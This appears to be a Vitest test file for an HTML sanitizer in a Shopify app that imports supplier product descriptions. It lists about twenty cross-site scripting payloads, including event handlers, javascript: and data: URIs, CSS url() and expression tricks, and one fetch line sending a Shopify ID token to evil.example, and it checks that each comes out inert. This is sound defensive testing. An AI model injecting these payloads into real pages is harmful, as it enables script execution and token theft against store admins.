/**
 * Description HTML is hostile input.
 *
 * It comes from a script on aliexpress.com, from supplier APIs and from a
 * language model behind a third-party gateway, and it used to be rendered into
 * the embedded admin after a regex that removed only double-quoted `on*="..."`
 * attributes. Every payload below got through that regex. Each must come out
 * unable to run script, whichever path stored it.
 */
import { describe, expect, it, vi } from "vitest";

vi.mock("~/shopify.server", () => ({ authenticate: {}, unauthenticated: {}, login: undefined, apiVersion: "2026-07", default: {} }));

const { sanitizeDescriptionHtml } = await import("~/lib/sanitize-html.server");
const { buildWritingContract } = await import("~/domain/copy/lumora-contract");
const { cleanDescription } = await import("~/services/import.server");
const { CapturedProduct, capturedToDetail } = await import("~/services/suppliers/captured.server");

/** Nothing that can execute or pull a script-bearing resource may survive. */
function expectInert(html: string) {
  expect(html).not.toMatch(/\son[a-z]+\s*=/i);
  expect(html).not.toMatch(/javascript:/i);
  expect(html).not.toMatch(/data:/i);
  expect(html).not.toMatch(/vbscript:/i);
  expect(html).not.toMatch(/<\s*(script|svg|iframe|object|embed|style|form|math|base|meta|link)\b/i);
  expect(html).not.toMatch(/url\s*\(/i);
  expect(html).not.toMatch(/expression\s*\(/i);
}

const PAYLOADS: Array<[string, string]> = [
  ["unquoted onerror", `<img src=x onerror=alert(document.domain)>`],
  ["single-quoted handler", `<img src='https://ae01.alicdn.com/a.jpg' onerror='fetch("//evil.example/"+shopify.idToken())'>`],
  ["handler with no space before it", `<img src="https://a.example/x.jpg"/onerror="alert(1)">`],
  ["svg onload", `<svg/onload=alert(1)><p>Soft cotton</p>`],
  ["svg with a nested script", `<svg><script>alert(1)</script></svg>`],
  ["mouseover the old check-rewrite missed", `<p onmouseover="alert(1)" onfocus="alert(2)" tabindex="1">Hover me</p>`],
  // eslint-disable-next-line no-script-url -- the hostile payload is the point of the test.
  ["javascript: href", `<a href="javascript:alert(1)">Size chart</a>`],
  ["mixed-case javascript: href with padding", `<a href="  JaVaScRiPt:alert(1)">Size chart</a>`],
  ["entity-encoded tab inside javascript:", `<a href="java&#x09;script:alert(1)">Size chart</a>`],
  ["data: URI image", `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`],
  ["data: URI link", `<a href="data:text/html,<script>alert(1)</script>">Open</a>`],
  ["vbscript: link", `<a href="vbscript:msgbox(1)">Open</a>`],
  ["script block", `<script>alert(1)</script><p>After</p>`],
  ["style block and css url()", `<style>body{background:url(javascript:alert(1))}</style><p style="background-image:url(https://evil.example/x)">Text</p>`],
  ["css expression", `<div style="width:expression(alert(1))">Legacy IE</div>`],
  ["css escape spelling url", String.raw`<div style="background:\75 rl(https://evil.example)">Escaped</div>`],
  ["iframe", `<iframe src="https://evil.example"></iframe>`],
  ["form posting elsewhere", `<form action="https://evil.example"><input name="token"><button>Go</button></form>`],
  ["meta refresh", `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`],
  ["srcset carrying a script url", `<img src="https://a.example/x.jpg" srcset="javascript:alert(1) 1x">`],
  ["unclosed tag swallowing a handler", `<img src="https://a.example/x.jpg" alt="<img onerror=alert(1)"`],
];

describe("sanitizeDescriptionHtml", () => {
  it.each(PAYLOADS)("neutralises %s", (_label, payload) => {
    expectInert(sanitizeDescriptionHtml(payload));
  });

  it.each(PAYLOADS)("neutralises %s when supplier links are stripped too", (_label, payload) => {
    expectInert(sanitizeDescriptionHtml(payload, { stripSupplierLinks: true }));
  });

  it("keeps what a product page legitimately needs", () => {
    const html =
      `<h2>Why it fits</h2><p>Made of <strong>100% cotton</strong>.</p>` +
      `<ul><li>Machine washable</li></ul>` +
      `<table><tbody><tr><th>Material</th><td>Cotton</td></tr></tbody></table>` +
      `<p><img src="https://ae01.alicdn.com/kf/a.jpg" alt="Front"></p>` +
      `<a href="https://example.com/size-guide">Size guide</a> <a href="mailto:help@example.com">Email us</a>`;
    const out = sanitizeDescriptionHtml(html);
    expect(out).toContain("<h2>Why it fits</h2>");
    expect(out).toContain("<strong>100% cotton</strong>");
    expect(out).toContain("<th>Material</th><td>Cotton</td>");
    expect(out).toContain('<img src="https://ae01.alicdn.com/kf/a.jpg" alt="Front" />');
    expect(out).toContain('href="https://example.com/size-guide"');
    expect(out).toContain('href="mailto:help@example.com"');
  });

  it("keeps the inline layout styles the AI landing page is built from, and nothing dangerous in them", () => {
    const html =
      `<div style="max-width:1080px;margin:0 auto;color:#2b2b2b;line-height:1.7;position:fixed">` +
      `<div style="display:flex;flex-wrap:wrap;gap:36px;align-items:center;flex-direction:row-reverse"><p style="color:rgba(0,0,0,.5)">x</p></div></div>`;
    const out = sanitizeDescriptionHtml(html);
    expect(out).toContain('style="max-width:1080px;margin:0 auto;color:#2b2b2b;line-height:1.7"');
    expect(out).toContain("flex-direction:row-reverse");
    expect(out).toContain("color:rgba(0,0,0,.5)");
    expect(out).not.toContain("position");
  });

  it("passes a contract-shaped rewritten page through unchanged", () => {
    // The skeleton the AI landing contract prescribes: the wrapper, a hero image,
    // an alternating feature row, the tinted "Before you buy" panel, the fixed
    // specification table, the FAQ accordion, a scrolling size chart and the
    // shipping panel with its mailto link. Anything the sanitizer drops here is
    // lost on every save and push of every rewritten product.
    const page = [
      `<div style="max-width:1080px;margin:0 auto;color:#2b2b2b;line-height:1.7">`,
      `<p style="color:#A84663;font-size:12px;letter-spacing:.18em;text-transform:uppercase;font-weight:700;margin:0 0 10px">The spoon is the scale</p>`,
      `<h2 style="font-size:34px;line-height:1.25;font-weight:600;margin:0 0 16px">Two grams of yeast does not register on a kitchen scale.</h2>`,
      `<img src="https://cdn.shopify.com/s/files/hero.jpg" alt="Hand holding the scale spoon over a bowl of flour" style="width:100%;border-radius:14px;display:block;margin:0 0 52px">`,
      `<div style="display:flex;flex-wrap:wrap;gap:36px;align-items:center;margin:0 0 52px;flex-direction:row-reverse">`,
      `<div style="flex:1 1 340px"><img src="https://cdn.shopify.com/s/files/row.jpg" alt="The display reading 2.1 g" style="width:100%;border-radius:14px;display:block"></div>`,
      `<div style="flex:1 1 340px"><h2 style="font-size:28px;line-height:1.3;font-weight:600;margin:0 0 14px">It reads in 0.1 g steps.</h2><p style="margin:0">That is <strong>0.1 g steps</strong>, which is what you want for yeast.</p></div>`,
      `</div>`,
      `<div style="background:#f6f2ef;color:#2b2b2b;border-radius:14px;padding:30px 28px;margin:0 0 52px">`,
      `<p style="color:#A84663;font-size:12px;letter-spacing:.18em;text-transform:uppercase;font-weight:700;margin:0 0 10px">Before you buy</p>`,
      `<ul style="margin:0;padding-left:20px"><li style="margin-bottom:8px"><strong>It is not a calibrated balance.</strong> Use a lab scale for that.</li></ul>`,
      `</div>`,
      `<table style="width:100%;table-layout:fixed;border-collapse:collapse;margin:0 0 52px;font-size:15px">`,
      `<tr><td style="padding:12px 0;border-bottom:1px solid #e8e2dd;width:38%;color:#6b6b6b">Capacity</td><td style="padding:12px 0;border-bottom:1px solid #e8e2dd">500 g (17.6 oz)</td></tr>`,
      `</table>`,
      `<div style="overflow-x:auto;overflow-y:hidden;margin:0 0 52px"><table style="width:100%;border-collapse:collapse"><tr><td style="vertical-align:top;border-top:1px solid #e8e2dd">S</td></tr></table></div>`,
      `<div style="margin:0 0 52px"><details style="border-bottom:1px solid #e8e2dd;padding:14px 0"><summary style="cursor:pointer;font-weight:600;font-size:16px">Can I wash it?</summary><p style="margin:12px 0 0">No. Wipe it.</p></details></div>`,
      `<div style="background:#f6f2ef;color:#2b2b2b;border-radius:14px;padding:30px 28px;margin:0 0 24px"><p style="margin:0"><strong>30-day returns.</strong> Email <a href="mailto:hello@example.com" style="color:#A84663">hello@example.com</a> to start a return.</p></div>`,
      `</div>`,
    ].join("\n");
    // The serializer writes void elements self-closed; that is the only difference allowed.
    const expected = page.replace(/<img([^>]*)>/g, "<img$1 />");
    expect(sanitizeDescriptionHtml(page)).toBe(expected);
    expect(cleanDescription(page, false)).toBe(expected);
  });

  it("keeps every CSS property the landing contract allows", () => {
    const contract = buildWritingContract({ name: "Harbor & Pine", supportEmail: "hello@harborpine.com", signOffTagline: null });
    const listed = /`(max-width, width, [^`]+)`/.exec(contract)?.[1];
    expect(listed).toBeTruthy();
    for (const property of (listed ?? "").split(",").map((p) => p.replace(/\(.*\)/, "").trim())) {
      const html = `<div style="${property}:inherit">x</div>`;
      expect(sanitizeDescriptionHtml(html), property).toBe(html);
    }
  });

  it("lets background carry a colour but never an image, an image-set or an escape", () => {
    const backslash = String.fromCharCode(92);
    const out = sanitizeDescriptionHtml(
      `<div style="background:#fff url(https://evil.example/a.png);color:red">a</div>` +
        `<div style="background:image-set('https://evil.example/a.png' 1x)">b</div>` +
        `<div style="background:-webkit-image-set('https://evil.example/a.png' 1x)">c</div>` +
        `<div style="background:${backslash}75 rl(https://evil.example/a.png)">d</div>` +
        `<div style="background:#f6f2ef">e</div>`,
    );
    expect(out).toBe(`<div style="color:red">a</div><div>b</div><div>c</div><div>d</div><div style="background:#f6f2ef">e</div>`);
  });

  it("drops images it cannot load and upgrades protocol-relative ones", () => {
    expect(sanitizeDescriptionHtml(`<p><img src="/relative.jpg"><img src="//ae01.alicdn.com/kf/b.jpg"></p>`)).toBe(
      '<p><img src="https://ae01.alicdn.com/kf/b.jpg" /></p>',
    );
  });

  it("does not let a new-tab link keep a handle on the admin", () => {
    expect(sanitizeDescriptionHtml(`<a href="https://example.com" target="_blank" rel="opener">x</a>`)).toBe(
      '<a href="https://example.com" target="_blank" rel="noopener noreferrer nofollow">x</a>',
    );
  });

  it("returns an empty string for nothing", () => {
    expect(sanitizeDescriptionHtml("")).toBe("");
    expect(sanitizeDescriptionHtml(null)).toBe("");
    expect(sanitizeDescriptionHtml(undefined)).toBe("");
  });
});

describe("cleanDescription (the import path)", () => {
  it("sanitizes even when the merchant turned supplier-link cleaning off", () => {
    const out = cleanDescription(`<p>Nice</p><img src=x onerror=alert(1)><a href="javascript:alert(1)">x</a>`, false);
    expectInert(out);
    expect(out).toContain("<p>Nice</p>");
  });

  it("strips supplier links, supplier domains in the text and emptied paragraphs when asked", () => {
    const out = cleanDescription(
      `<p>Visit shop.aliexpress.com today <a href="https://www.aliexpress.com/store/1">our store</a></p><p> </p><p><img src="https://ae01.alicdn.com/kf/a.jpg"></p>`,
      true,
    );
    expect(out).toBe('<p>Visit shop. today our store</p><p><img src="https://ae01.alicdn.com/kf/a.jpg" /></p>');
  });

  it("drops a paragraph whose only content was a supplier link", () => {
    expect(cleanDescription(`<p><a href="https://www.aliexpress.com/store/1">aliexpress.com</a></p><p>Kept</p>`, true)).toBe("<p>Kept</p>");
  });
});

describe("captured products", () => {
  const base = {
    externalId: "1005006001",
    title: "Cotton tee",
    url: "https://www.aliexpress.com/item/1005006001.html",
    currency: "USD",
    variants: [{ externalSkuId: "1", price: "3.50", stock: 5 }],
  };

  it("sanitizes the description the extension sends before it is stored", () => {
    const parsed = CapturedProduct.parse({ ...base, descriptionHtml: `<p>Soft</p><svg onload=alert(1)></svg><img src=x onerror=alert(1)>` });
    const detail = capturedToDetail(parsed, "ALIEXPRESS", "1005006001");
    expectInert(detail.descriptionHtml);
    expect(detail.descriptionHtml).toBe("<p>Soft</p>");
  });

  it("clips an oversized description instead of rejecting the whole product", () => {
    const huge = `<p>${"a".repeat(250_000)}</p>`;
    const parsed = CapturedProduct.safeParse({ ...base, descriptionHtml: huge });
    expect(parsed.success).toBe(true);
    if (!parsed.success) return;
    expect(parsed.data.descriptionHtml.length).toBe(200_000);
    const detail = capturedToDetail(parsed.data, "ALIEXPRESS", "1005006001");
    expect(detail.descriptionHtml.startsWith("<p>")).toBe(true);
    expect(detail.descriptionHtml.endsWith("</p>")).toBe(true);
  });

  it("still refuses a payload that is plainly not a description", () => {
    expect(CapturedProduct.safeParse({ ...base, descriptionHtml: "x".repeat(1_000_001) }).success).toBe(false);
  });
});
